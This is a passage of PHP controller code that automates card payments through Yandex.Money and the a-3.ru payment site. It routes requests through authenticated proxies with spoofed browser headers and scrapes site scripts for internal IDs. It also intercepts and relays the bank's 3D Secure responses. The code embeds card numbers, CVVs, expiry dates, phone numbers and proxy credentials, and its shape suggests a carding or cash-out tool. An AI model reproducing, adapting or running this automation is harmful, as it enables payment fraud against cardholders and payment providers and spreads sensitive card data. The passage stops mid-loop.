		$url = 'https://money.yandex.ru/transfer?receiver=410018162811377&sum=150&targets=%D0%9F%D0%BE%D0%BF%D0%BE%D0%BB%D0%BD%D0%B5%D0%BD%D0%B8%D0%B5%20%D0%B1%D0%B0%D0%BB%D0%B0%D0%BD%D1%81%D0%B0&comment=Exchange+%2315753630096404&origin=form&selectedPaymentType=AC&label=i_5de621c19c5c23.01714432&destination=%D0%9F%D0%BE%D0%BF%D0%BE%D0%BB%D0%BD%D0%B5%D0%BD%D0%B8%D0%B5%20%D0%B1%D0%B0%D0%BB%D0%B0%D0%BD%D1%81%D0%B0&form-comment=%D0%9F%D0%BE%D0%BF%D0%BE%D0%BB%D0%BD%D0%B5%D0%BD%D0%B8%D0%B5%20%D0%B1%D0%B0%D0%BB%D0%B0%D0%BD%D1%81%D0%B0&short-dest=%D0%9F%D0%BE%D0%BB%D0%BE%D0%BB%D0%BD%D0%B5%D0%BD%D0%B8%D0%B5%20%D0%B1%D0%B0%D0%BB%D0%B0%D0%BD%D1%81%D0%B0&successURL=https://btc-exchange.biz/sthst-complete/?h=04cb144211bbb9591c17ae6c6ddaafda&failURL=https://btc-exchange.biz/sthst-fail/?h=04cb144211bbb9591c17ae6c6ddaafda';

		$card = '4729340279256061';
		$cardYear = '2023';
		$cardMonth = '07';
		$cvv = '509';
		$proxy = 'le95olD7Zx:xlcdfbon@185.134.120.180:55004';
		$userAgent = 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0';

		//выше задаются основные параметры

		$sender = new Sender;
		$sender->followLocation = false;
		$sender->useCookie = true;

		$resulArr = [];

		parse_str($url, $urlParams);

		$comment = $urlParams['comment'];
		$formComment = $urlParams['form-comment'];
		$shortDest = $urlParams['short-dest'];
		$successURL = $urlParams['successURL'];
		$label = $urlParams['label'];
		$recipientAccount = $urlParams['https://money_yandex_ru/transfer?receiver'];
		$amount = $urlParams['sum'];

		$sender->additionalHeaders = null;
		$sender->additionalHeaders = [
			'Host: money.yandex.ru',
			$userAgent,
			'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
			'Accept-Encoding: gzip, deflate, br',
			'DNT: 1',
			'Connection: keep-alive',
			'Upgrade-Insecure-Requests: 1',
			'Pragma: no-cache',
			'Cache-Control: no-cache'
		];

		$content = $sender->send($url, null, $proxy);

		if(!preg_match('!set-is-favorite-payment\?sk=(.+?)\"!iu', $content, $matches))
			prrd('error1');

		$sk = $matches[1];

		if(!preg_match('!"tmxSessionId\":\"(.+?)\"!iu', $content, $matches))
			prrd('error2');

		$tmxSessionId = $matches[1];

		//2
		$url = 'https://paymentcard.yamoney.ru/webservice/storecard/api/storeCardForPayment';
		$postData = '{"cardholder":"CARD HOLDER","csc":"'.$cvv.'","pan":"'.$card.'","expireDate":"'.$cardYear.$cardMonth.'"}';
		$sender->additionalHeaders = null;
		$sender->additionalHeaders = [
			'Host: paymentcard.yamoney.ru',
			$userAgent,
			'Accept: application/json, text/javascript, */*; q=0.01',
			'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
			'Accept-Encoding: gzip, deflate, br',
			'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
			'Content-Length: '.strlen($postData),
			'Origin: https://money.yandex.ru',
			'DNT: 1',
			'Connection: keep-alive',
			'Pragma: no-cache',
			'Cache-Control: no-cache'
		];

		$content = $sender->send($url, $postData, $proxy);

		if(!$jsonData = json_decode($content, 1) and $jsonData['status'] !== "success")
			prrd('error3');

		$cardSynomyn = $jsonData['result']['cardSynonym'];

		//4
		$url = 'https://money.yandex.ru/transfers';
		$postData = 'paymentCardSynonym='.$cardSynomyn.'&origin=form&comment='
			.$comment.'&formComment='.$formComment.'&userLastname=&userFirstname=&userFathersname='.
			'&userPhone=&userEmail=&userCity=&shortDest='.$shortDest.'&targets='.$shortDest.'&destination='
			.$shortDest.'&billNumber=&billDescription=&shopHost=&successURL='.$successURL.'&label='.$label
			.'&recipientAccount='.$recipientAccount.'&amount='.$amount.'&transfersScheme=anyCardToWallet&tmxSessionId='
			.$tmxSessionId.'&sk='.$sk;

		$sender->additionalHeaders = null;
		$sender->additionalHeaders = [
			'Host: money.yandex.ru',
			$userAgent,
			'Accept: application/json, text/javascript, */*; q=0.01',
			'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
			'Accept-Encoding: gzip, deflate, br',
			'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
			'X-Requested-With: XMLHttpRequest',
			'Content-Length: '.strlen($postData),
			'DNT: 1',
			'Connection: keep-alive',
			'Pragma: no-cache',
			'Cache-Control: no-cache'
		];

		//{"status":"progress","timeout":3,"url":"https://money.yandex.ru/transfers/confirm/any-card-to-wallet?orderId=2575ec91-0011-5000-9000-1c5c30d17f0f&extAuthFailUri=https%3A%2F%2Fmoney.yandex.ru%2Ftransfers%2Fland3ds%3ForderId%3D2575ec91-0011-5000-9000-1c5c30d17f0f&extAuthSuccessUri=https%3A%2F%2Fmoney.yandex.ru%2Ftransfers%2Fland3ds%3ForderId%3D2575ec91-0011-5000-9000-1c5c30d17f0f&sk=y8f80ecca445807b1ea0ef7aff739e308"}
		$content = $sender->send($url, $postData, $proxy);

		if(!$jsonData = json_decode($content, 1) and $jsonData['status'] !== "success")
			prrd('error4');

		$confirmUrl = $jsonData['confirmUrl'];

		if(!preg_match('!orderId=(.+?)$!iu', $jsonData['confirmUrl'], $matches))
			prrd('error5');

		$orderId = $matches[1];

		//5
		$url = 'https://money.yandex.ru/transfers/confirm/any-card-to-wallet?orderId='.$orderId;
		$postData = 'extAuthFailUri=https%3A%2F%2Fmoney.yandex.ru%2Ftransfers%2Fland3ds%3ForderId%3D'.$orderId
			.'&extAuthSuccessUri=https%3A%2F%2Fmoney.yandex.ru%2Ftransfers%2Fland3ds%3ForderId%3D'.$orderId.'&sk='.$sk;
		$sender->additionalHeaders = null;
		$sender->additionalHeaders = [
			'Host: money.yandex.ru',
			$userAgent,
			'Accept: application/json, text/javascript, */*; q=0.01',
			'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
			'Accept-Encoding: gzip, deflate, br',
			'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
			'X-Requested-With: XMLHttpRequest',
			'Content-Length: '.strlen($postData),
			'DNT: 1',
			'Connection: keep-alive',
			'Pragma: no-cache',
			'Cache-Control: no-cache'
		];

		$content = $sender->send($url, $postData, $proxy);

		if(!$jsonData = json_decode($content, 1))
			prrd('error6');

		if($jsonData['status'] == 'progress')
			sleep($jsonData['timeout']*1+1);

		//6
		$url = 'https://money.yandex.ru/transfers/confirm/any-card-to-wallet?orderId='.$orderId
			.'&extAuthFailUri=https%3A%2F%2Fmoney.yandex.ru%2Ftransfers%2Fland3ds%3ForderId%3D'
			.$orderId.'&extAuthSuccessUri=https%3A%2F%2Fmoney.yandex.ru%2Ftransfers%2Fland3ds%3ForderId%3D'
			.$orderId.'&sk='.$sk;

		$postData = 'sk='.$sk;

		$sender->additionalHeaders = null;
		$sender->additionalHeaders = [
			'Host: money.yandex.ru',
			$userAgent,
			'Accept: application/json, text/javascript, */*; q=0.01',
			'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
			'Accept-Encoding: gzip, deflate, br',
			'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
			'X-Requested-With: XMLHttpRequest',
			'Content-Length: '.strlen($postData),
			'DNT: 1',
			'Connection: keep-alive',
			'Pragma: no-cache',
			'Cache-Control: no-cache'
		];

		$content = $sender->send($url, $postData, $proxy);

		if(!$jsonData = json_decode($content, 1) and $jsonData['status'] !== "success")
			prrd('error7');

		$resulArr = [
			'url' => $jsonData['url'],
			'md' => $jsonData['params']['MD'],
			'paReq' => $jsonData['params']['PaReq'],
			'termUrl' => $jsonData['params']['TermUrl']
		];

		prrd($resulArr);

	}

	public function actionParser()
	{
		$formData = '<html> <head> <title>3D Secure Verification</title> </head> <body OnLoad="OnLoadEvent();" > <iframe style=\'display:none\' src=\'https://www.a-3.ru/redirectFrame.php?domainA3=https%3A%2F%2Fwww.a-3.ru%2Fresult?transactionId=115996289\'></iframe> <form name="mainform" action="https://pay.best2pay.net/gateweb/PaReq" method="POST"> <noscript> <br> <br> <center> <h1>Processing your 3D Secure Transaction</h1> <h2> JavaScript is currently disabled or is not supported by your browser.<br></h2> <h3>Please click Submit to continue the processing of your 3D Secure transaction.</h3> <input type="submit" value="Submit"> </center> </noscript> <textarea name="PaReq" style="display:none">eJxVUs1u2kAQfhXLp0YV7HoNGKNhIwqkJQokokSquBl7EruJDaztQHpsr32HSHmCqFKaA1L7Cssbddfg0Jx2vm9m5+8bOF7Ht8YdijSaJ23TqlLTwMSfB1Fy3TYvJyeVpnnMYRIKxN5n9HOBHIaYpt41GlHQNi86Y1y2vuBsNQ5odB7NuuG4M+z601F/ZXIo3Bz2BbjKX2VASqgyCT/0koyD5y8/DEa85jQYbQLZQ4hRDHqcUurYrssatZrVtCwgOxoSL0beqdhACgv8eZ5k4p43aooqAeTilodZtmgR4lXsqsiBaArIofpFrq1UpVhHAc+83AnotPExOf12dxXPTuujLLg5ef81HraB6AgIvAw5o5ZrMWobzG7ZVstygBQ8eLGuzS1HNa5m2SFY6CKdN67/KVDLFWr3ZfslAlwv5gmqCLW5VxsCTH0uH+RGPm2/y2f525C/DPlX/pGb7U/5sv1hyEdFb+QzM95N+md9dqTa059grHXkcCVwmRcl1EYPADAJdhGMqgmZrbyvFJDyPays+0nL52dKEUa1QnW37p6Fq1V84w7CLg4ul72p42pRiyA9UKSE0cmLiTQAotOQ/b2Q/Ykp683p/QOBVe10</textarea> <input type="hidden" name="TermUrl" value="https://3ds.payment.ru/cgi-bin/cgi_link"> <input type="hidden" name="MD" value="453414277-B4C4BEE292016F61"> </form> <SCRIPT LANGUAGE="Javascript" > <!-- function OnLoadEvent() { document.mainform.submit(); } //--> </SCRIPT> </body> </html>';
		if(preg_match('!name="mainform"\s+action="(.+?)"!iu', $formData, $matches))
			$mainFormUrl = $matches[1];
		else
			prrd('error 13');

		if(preg_match('!name="PaReq"\s+style="display:none">(.+?)<!iu', $formData, $matches))
			$paReq = $matches[1];
		else
			prrd('error 14');

		if(preg_match('!name="TermUrl"\s+value="(.+?)"!iu', $formData, $matches))
			$termUrl = $matches[1];
		else
			prrd('error 15');

		if(preg_match('!name="MD"\s+value="(.+?)"!iu', $formData, $matches))
			$md = $matches[1];
		else
			prrd('error 16');

		$result = [
			'mainform' => $mainFormUrl,
			'PaReq' => $paReq,
			'TermUrl' => $termUrl,
			'MD' => $md,
		];

		prrd($result);
	}

	//запасная проверка черерз сервис а3
	//этот метод обращается к а3 и чекает статус заявки, он показывает в обработке часто, но это норм
	public function actionCheckStatus()//($transactionIdA3, $cardNumber, $basketId, $paidServiceId, $totalSum, $termUrl, $operationId)
	{
		session_write_close();
		$model = SimTransaction::getModel(['order_id'=>7898257747886112]);

		if(!$model)
			exit('Error model');

		$params = json_decode($model->pay_params, 1);

		$runtimePath = DIR_ROOT.'protected/runtime/';

		if(!file_exists($runtimePath.'cardPay/'))
			mkdir($runtimePath.'cardPay/');

		if(!file_exists($runtimePath.'cardPay/cookie/'))
			mkdir($runtimePath.'cardPay/cookie/');


		$sender = new Sender();
		$sender->useCookie = true;
		$sender->cookieFile = $runtimePath.'cardPay/cookie/'.md5($params['browser'].$params['proxy']).'.txt';
		$sender->pause = 1;
		$sender->followLocation = false;
		$sender->proxyType = $params['proxyType'];

		$userAgent = $params['browser'];

		$url = 'https://www.a-3.ru/front/operation/get_transaction_result_by_id.do?transaction_id='.$params['transactionIdA3'];

		$sender->additionalHeaders = null;
		$sender->additionalHeaders = [
			'Host: www.a-3.ru',
			$userAgent,
			'Accept: */*',
			'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
			'Accept-Encoding: gzip, deflate, br',
			'Connection: keep-alive',
			'Referer: https://www.a-3.ru/frame/?basketId='.urldecode($params['basketId']).'&paidServices='.$params['paidServices'].'&source=a3&sum='.$params['sum'].'&toolListOperId='.urldecode($params['operationId']),
			'Pragma: no-cache',
			'Cache-Control: no-cache'
		];
		
		$content = $sender->send($url, null, $params['proxy']);

		/*
		 {
			"result": "1",
			"transaction_result": [{
				"id": 116955075,
				"unit": "Другие услуги",
				"result": 0,
				"status": "выполнена",
				"nesp": "PSB-N-9774178437",
				"requisites": [{
					"name": "Сумма, руб.:",
					"value": "298"
				}],
				"payer": " ",
				"email": null,
				"sum": "298.00 руб.",
				"fee": "20.00 руб.",
				"total": "318.00 руб.",
				"extPaidServiceID": null,
				"fail_reason": null,
				"insert_date": "2019-12-13 13:10:47.458",
				"status_id": 2,
				"card_name": "****6482",
				"card_number": "2***6482",
				"channel_description": "Интернет-портал",
				"paidservice_name": "Теле2 (TELE2)",
				"paidservice_id": 1028,
				"category_id": 400,
				"category_name": "Мобильная связь",
				"fee_description": "Комиссия",
				"bank_name": "ПАО «Промсвязьбанк» ИНН 7744000912, Генеральная лицензия Банка России №3251",
				"bank_location": "109052, г. Москва, ул. Смирновская д. 10, стр. 22",
				"bank_phone": "8(800)-555-20-20, (495)787-33-34",
				"is_new_client": 0,
				"is_obr": 0,
				"auth_code": "287523",
				"personal_accounts": [{
					"name": "Номер телефона +7",
					"value": "9774178437"
				}]
			}]
		 }
		 */

		if(!$transactionArr = json_decode($content, true))
		{
			//TODO: при переносе в класс SimTransaction раскомментить
			//return self::cardError('error1 check', $transactionArr, $sender, 'error1 check code: '.$sender->info['httpCode'][0].', content: '.$content);
			//TODO: а строку ниже убрать
			exit('error1 check');
		}

		if($transactionArr['transaction_result'][0]['status'] == "выполнена")
			return 'success';
		elseif($transactionArr['transaction_result'][0]['status'] == "в обработке")
			return 'processing';
		else
		{
			//TODO: при переносе в класс SimTransaction раскомментить
			//return self::cardError('error2 check', $transactionArr, $sender, 'error2 check code: '.$sender->info['httpCode'][0].', content: '.$content);
			return 'error';
		}
	}

	//тут делаем передачу в банк в termUrl, но попутно можем парсить ответ
	public function actionFinishPayment($params)
	{
		session_write_close();
		$rawRequest = file_get_contents('php://input');
		prrd($rawRequest);
		$referer = getenv("HTTP_REFERER");

		//так как у нас пост запрос от банка, get параметры не передаются обычным образом
		parse_str($_SERVER['REQUEST_URI'], $getParams);

		$proxy = 'le95olD7Zx:xlcdfbon@213.159.202.214:55004';
		$sender = new Sender;
		$sender->followLocation = false;
		$sender->useCookie = true;

		$userAgent = 'User-Agent: '.$_SERVER['HTTP_USER_AGENT'];

		$termUrlArr = parse_url($getParams['termUrl']);
		$termUrlHost = $termUrlArr['host'];

		$sender->additionalHeaders = null;
		$sender->additionalHeaders = [
			$userAgent,
			'Accept: */*',
			'Referer: '.$referer,
		];

		if(!$getParams['termUrl'])
			exit('termUrl not found');

		$content = $sender->send($getParams['termUrl'], $rawRequest, $proxy);

		//перехватываем ответ от банка
		if(preg_match('!(\{.+?\})!iu', $content, $matches))
		{
			/*
			 * ответ такого вида
			 * {"AMOUNT":"120.00","CURRENCY":"RUB","ORDER":"116082672","DESC":"Платеж в пользу Теле2 (TELE2)","MERCH_NAME":"A3 payment agent","MERCHANT":"000739926441810","TERMINAL":"26441810","EMAIL":"","TRTYPE":"1","TIMESTAMP":"20191204211752","NONCE":"09206342453062BBEA3853BBB7E90568","BACKREF":"https://www.a-3.ru:443/psBankReceiver/callback/?gogo=116082672","RESULT":"0","RC":"00","RCTEXT":"Approved","AUTHCODE":"DNZ55Z","RRN":"933992594906","INT_REF":"9D9EA3EA2D2B7DFB","P_SIGN":"B04B1EDD8E5E555D12CE945B5A548B19A9379F7E","EXT_DIAG_CODE":"NONE"}
			 *
			 */
			$result = json_decode($matches[1], true);

			if($result["RCTEXT"] == "Approved")
				prrd('Success paiment');
			else
				prrd('Error payment');

		}

		if(preg_match('!Your browser sent a request that this server could not understand!iu', $content, $matches))
			exit('Bad request');

		var_dump($content);die;
	}

	//основной метод, вся обработка тут
	public function actionFormA3($orderId='')
	{

		if(!$_SESSION['cacheParams'])
			$_SESSION['cacheParams'] = [];

		session_write_close();

		$sum = 150;
		$orderId = time();

		$order['amount'] = $sum;
		$order['clientOrderId'] = $orderId;

//TODO: если графически тестить
//это вариант для накладки
//		if($_POST['ajaxPay'])
//		{
			set_time_limit(120);
			//сохранить чтобы не вбивать каждый раз
			$_SESSION['cacheParams'] = $_POST;

			//для теста берем статичные данные
			$cardYear = '20';
			$cardMonth = '12';
			$cardNumber = '4890494682626304';
			$cvv = '100';

			//TODO: если графически тестить
			//это вариант для накладки
//			$postData = $_POST;
//			$cardYear = $postData['cardY'];
//			$cardMonth = $postData['cardM'];
//			$cardNumber = preg_replace('!\s!', '', $postData['cardNumber']);
//			$cvv = $postData['cardCvv'];

			$proxy = 'le95olD7Zx:xlcdfbon@213.159.202.214:55004';
			$phone = '9771915193'; // 9774115613  9771915193
//			$userAgent = 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0';
			$userAgent = 'User-Agent: '.$_SERVER['HTTP_USER_AGENT'];
			$params = [];

			set_time_limit(120);

			$runtimePath = DIR_ROOT.'protected/runtime/';

			if(!file_exists($runtimePath.'cardPay/'))
				mkdir($runtimePath.'cardPay/');

			if(!file_exists($runtimePath.'cardPay/cookie/'))
				mkdir($runtimePath.'cardPay/cookie/');

			$sender = new Sender;
			$sender->useCookie = true;
			$sender->cookieFile = $runtimePath.'cardPay/cookie/'.md5($cardNumber).'.txt';
			$sender->followLocation = false;

			//парсим названия скриптов (с динамическими id в названии)
			$url = 'https://www.a-3.ru/dist/';
			$sender->additionalHeaders = null;
			$sender->additionalHeaders = [
				'Host: www.a-3.ru',
				$userAgent,
				'Accept: */*',
				'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
				'Accept-Encoding: gzip, deflate, br',
				'Connection: keep-alive',
				'Referer: https://www.a-3.ru/pay_mobile/',
				'Pragma: no-cache',
				'Cache-Control: no-cache'
			];

			$content = $sender->send($url, null, $proxy);

			if(!preg_match('!main\.(.+?)\.js!iu', $content, $matches))
			{
				if(YII_DEBUG)
				{
					echo json_encode(['errorMsg'=>'parser error 0']);die;
				}
				else
					prrd('error 0');
			}

			$hashInScritpName = $matches[1];

			//берем переменную $strategyId
			$url = 'https://www.a-3.ru/dist/main.'.$hashInScritpName.'.js';
			$sender->additionalHeaders = null;
			$sender->additionalHeaders = [
				'Host: www.a-3.ru',
				$userAgent,
				'Accept: */*',
				'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
				'Accept-Encoding: gzip, deflate, br',
				'Connection: keep-alive',
				'Referer: https://www.a-3.ru/pay_mobile/',
				'Pragma: no-cache',
				'Cache-Control: no-cache'
			];

			$content = $sender->send($url, null, $proxy);

			if(!preg_match('!strategy_id\:(\d+),sum!iu', $content, $matches))
			{
				if(YII_DEBUG)
				{
					echo json_encode(['errorMsg'=>'javascript error 1']);die;
				}
				else
					prrd('error 1');
			}

			$strategyId = $matches[1];

//			exit($strategyId);

			//тут вытаскиваем $paidserviceId и $partnerId
			$url = 'https://www.a-3.ru/dist/Chat.'.$hashInScritpName.'.js';
			$sender->additionalHeaders = null;
			$sender->additionalHeaders = [
				'Host: www.a-3.ru',
				$userAgent,
				'Accept: */*',
				'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
				'Accept-Encoding: gzip, deflate, br',
				'Connection: keep-alive',
				'Referer: https://www.a-3.ru/pay_mobile/',
				'Pragma: no-cache',
				'Cache-Control: no-cache'
			];

			$content = $sender->send($url, null, $proxy);

			if(!preg_match('!\{paidservice_id\:(\d+),partner_id\:(\d+)\}!iu', $content, $matches))
			{
				if(YII_DEBUG)
				{
					echo json_encode(['errorMsg'=>'javascript 2 error']);die;
				}
				else
					prrd('error 2');
			}

			$paidserviceId = $matches[1];
			$partnerId = $matches[2];

			//1
			$url = rawurldecode('https://www.a-3.ru/front/msp/init_step_sequence_obr.do');
			$postData = 'channel=0&paidservice_id='.$paidserviceId.'&partner_id='.$partnerId.'&phone_number='.$phone.'&strategy_id='.$strategyId.'&sum='.$sum;

			$sender->additionalHeaders = [
				'Host: www.a-3.ru',
				$userAgent,
				'Accept: */*',
				'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
				'Accept-Encoding: gzip, deflate, br',
				'Content-Type: application/x-www-form-urlencoded',
				'Origin: https://www.a-3.ru',
				'Content-Length: '.strlen($postData),
				'DNT: 1',
				'Connection: keep-alive',
				'Referer: https://www.a-3.ru/pay_mobile/',
				'Pragma: no-cache',
				'Cache-Control: no-cache'
			];

			$content = $sender->send($url, $postData, $proxy);

			if(!$data = @json_decode($content, true))
			{
				if(YII_DEBUG)
				{
					echo json_encode(['errorMsg'=>'error 3']);die;
				}
				else
					prrd('error 3');
			}

			$operationId = $data['item']['operation_id'];

			//		exit($operationId);
			$sender->additionalHeaders = false;

			$sender->additionalHeaders = [
				'Host: www.a-3.ru',
				$userAgent,
				'Accept: */*',
				'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
				'Accept-Encoding: gzip, deflate, br',
				'DNT: 1',
				'Connection: keep-alive',
				'Referer: https://www.a-3.ru/pay_mobile/',
				'Pragma: no-cache',
				'Cache-Control: no-cache'
			];

			//step 2
			$url = 'https://www.a-3.ru/front/msp/get_current_step.do?operation_id='.$operationId;

			$content = $sender->send($url, false, $proxy);

			$sender->additionalHeaders = false;

			$sender->additionalHeaders = [
				'Host: www.a-3.ru',
				$userAgent,
				'Accept: */*',
				'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
				'Accept-Encoding: gzip, deflate, br',
				'Content-Type: application/x-www-form-urlencoded',
				'Origin: https://www.a-3.ru',
				'Content-Length: 0',
				'DNT: 1',
				'Connection: keep-alive',
				'Referer: https://www.a-3.ru/pay_mobile/',
				'Pragma: no-cache',
				'Cache-Control: no-cache'
			];

			//step 3
			$url = rawurldecode('https://www.a-3.ru/front/msp/store_step.do?AMOUNT%2410%2420='.
				$sum.'&NUMBER%2410%2410='.$phone.'&operation_id='.$operationId.'&phone_number=&sum='.$sum);

			$content = $sender->send($url, [], $proxy);

			//
			$url = 'https://www.a-3.ru/front/msp/get_session_data.do';
			$sender->additionalHeaders = false;

			$sender->additionalHeaders = [
				'Host: www.a-3.ru',
				$userAgent,
				'Accept: */*',
				'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
				'Accept-Encoding: gzip, deflate, br',
				'DNT: 1',
				'Connection: keep-alive',
				'Referer: https://www.a-3.ru/pay_mobile/'
			];

			$content = $sender->send($url, false, $proxy);

			if(!$dataArr = @json_decode($content, true))
			{
				if(YII_DEBUG)
				{
					echo json_encode(['errorMsg'=>'error 4']);die;
				}
				else
					prrd('error 4');
			}

			//		exit($dataArr);

			$dataValue = $dataArr['data'];

			//step4
			$url = 'https://www.a-3.ru/basket-service/v1/basket/check?multistep_id='.$dataValue;
			$content = $sender->send($url, false, $proxy);

			if(!$dataArr = @json_decode($content, true))
			{
				if(YII_DEBUG)
				{
					echo json_encode(['errorMsg'=>'error 4']);die;
				}
				else
					prrd('error 5');
			}

			if($dataArr['response_status'] !== 1 or $dataArr['response_status']['basket_id' !== ''])
			{
				if(YII_DEBUG)
				{
					echo json_encode(['errorMsg'=>'error 6']);die;
				}
				else
					prrd('error 6');
			}

			//step 5
			$url = 'https://www.a-3.ru/basket-service/v1/basket?multistep_id='.$dataValue;

			$sender->additionalHeaders = false;

			$sender->additionalHeaders = [
				'Host: www.a-3.ru',
				$userAgent,
				'Accept: */*',
				'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
				'Accept-Encoding: gzip, deflate, br',
				'Content-Type: application/x-www-form-urlencoded',
				'Origin: https://www.a-3.ru',
				'Referer: https://www.a-3.ru/pay_mobile/',
				'Content-Length: 0'
			];

			$content = $sender->send($url, [], $proxy);

			if(!$dataArr = @json_decode($content, true))
			{
				if(YII_DEBUG)
				{
					echo json_encode(['errorMsg'=>'error 6']);die;
				}
				else
					prrd('error 7');
			}

			if(!$basketId = $dataArr['response_data']['basket_id'])
			{
				if(YII_DEBUG)
				{
					echo json_encode(['errorMsg'=>'error 8']);die;
				}
				else
					prrd('error 8');

			}
			sleep(1);
			//step 6
			$url = 'https://www.a-3.ru/basket-service/v1/basket/'.$basketId.'/item/'.$operationId;

			$sender->additionalHeaders = false;

			$sender->additionalHeaders = [
				'Host: www.a-3.ru',
				$userAgent,
				'Accept: */*',
				'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
				'Accept-Encoding: gzip, deflate, br',
				'Content-Type: application/x-www-form-urlencoded',
				'Origin: https://www.a-3.ru',
				'Content-Length: 0',
				'Connection: keep-alive',
				'Referer: https://www.a-3.ru/pay_mobile/',
				'Pragma: no-cache',
				'Cache-Control: no-cache'
			];

			$content = $sender->send($url, [], $proxy);
			if(!$dataArr = @json_decode($content, true) or $dataArr['response_status'] !== 1)
			{
				if(YII_DEBUG)
				{
					echo json_encode(['errorMsg'=>'error 9']);die;
				}
				//"{"response_status":0,"response_data":{"message":"Операция не завершена","code":50001}}"
				else
					prrd('error 9');

			}

			//step 7

			$url = 'https://www.a-3.ru/basket-service/v1/basket/'.$basketId;

			$sender->additionalHeaders = false;

			$sender->additionalHeaders = [
				'Host: www.a-3.ru',
				$userAgent,
				'Accept: */*',
				'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
				'Accept-Encoding: gzip, deflate, br',
				'DNT: 1',
				'Connection: keep-alive',
				'Referer: https://www.a-3.ru/pay_mobile/',
				'Pragma: no-cache'
			];

			$content = $sender->send($url, false, $proxy);

			if(!$dataArr = @json_decode($content, true) or $dataArr['response_status'] !== 1)
			{
				if(YII_DEBUG)
				{
					echo json_encode(['errorMsg'=>'error 10']);die;
				}
				else
					prrd('error 10');

			}

			$paidServiceId = $dataArr['response_data']['description'][0]['paidservice_id'];
			$fee = $dataArr['response_data']['total_fee']*1;
			$totalSum = $sum + $fee;

			//		exit($dataArr['response_data']);

			//step 8
			$url = 'https://www.a-3.ru/frame/?basketId='.$basketId.'&paidServices='.
				$paidServiceId.'&source=a3&sum='.$totalSum.'&toolListOperId='.$operationId;

			$sender->additionalHeaders = false;

			$sender->additionalHeaders = [
				'Host: www.a-3.ru',
				$userAgent,
				'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
				'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
				'Accept-Encoding: gzip, deflate, br',
				'DNT: 1',
				'Connection: keep-alive',
				'Referer: https://www.a-3.ru/pay_mobile/',
				'Upgrade-Insecure-Requests: 1',
				'Pragma: no-cache',
				'Cache-Control: no-cache'
			];

			$content = $sender->send($url, false, $proxy);

			//step 9
			$url = 'https://www.a-3.ru/front/operation/offer?phoneNumber='.$phone;
			$sender->additionalHeaders = false;

			$sender->additionalHeaders = [
				'Host: www.a-3.ru',
				$userAgent,
				'Accept: */*',
				'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
				'Accept-Encoding: gzip, deflate, br',
				'DNT: 1',
				'Connection: keep-alive',
				'Referer: https://www.a-3.ru/pay_mobile/',
				'Pragma: no-cache',
				'Cache-Control: no-cache'
			];

			$content = $sender->send($url, false, $proxy);

			if(!$dataArr = @json_decode($content, true) or $dataArr['result'] != 1)
			{
				if(YII_DEBUG)
				{
					echo json_encode(['errorMsg'=>'error 11']);die;
				}
				else
					prrd('error 11');

			}

			//step 10
			$url = 'https://www.a-3.ru/basket-service/v1/basket/'.$basketId;
			$sender->additionalHeaders = false;

			$sender->additionalHeaders = [
				'Host: www.a-3.ru',
				$userAgent,
				'Accept: */*',
				'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
				'Accept-Encoding: gzip, deflate, br',
				'Content-Type: application/x-www-form-urlencoded',
				'DNT: 1',
				'Connection: keep-alive',
				'Referer: https://www.a-3.ru/pay_mobile/',
				'Pragma: no-cache',
				'Cache-Control: no-cache',
				'Content-Length: 0'
			];
			$content = $sender->send($url, false, $proxy);

			//step 11
			$url = 'https://www.a-3.ru/front/msp/tool_add.do';
			$sender->additionalHeaders = false;
			$postData = 'cvv='.$cvv.'&exp='.$cardYear.$cardMonth.'&phone='.$phone.'&number='.$cardNumber.'&operation_id='.$operationId;
			$sender->additionalHeaders = [
				'Host: www.a-3.ru',
				$userAgent,
				'Accept: */*',
				'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
				'Accept-Encoding: gzip, deflate, br',
				'Content-Type: application/x-www-form-urlencoded',
				'Content-Length: '.strlen($postData),
				'DNT: 1',
				'Connection: keep-alive',
				'Referer: https://www.a-3.ru/pay_mobile/',
				'Pragma: no-cache',
				'Cache-Control: no-cache'
			];

			$content = $sender->send($url, $postData, $proxy);

			if(!$dataArr = @json_decode($content, true))
			{
				if(YII_DEBUG)
				{
					echo json_encode(['errorMsg'=>'error 12']);die;
				}
				else
					prrd('error 12');
			}
			elseif($dataArr['response_status'] == 0)
			{
				if(YII_DEBUG)
				{
					echo json_encode(['errorMsg'=>$dataArr['response_data']]);die;
				}
				else
					$this->error = 'Ошибка платежа';
			}

			//по этому id можно проверять статус платежа
			$transactionIdA3 = $dataArr['response_data']['transaction_id'];

			$tryCount = 30;

			for($i = 0; $i < $tryCount; $i = $i + 1)
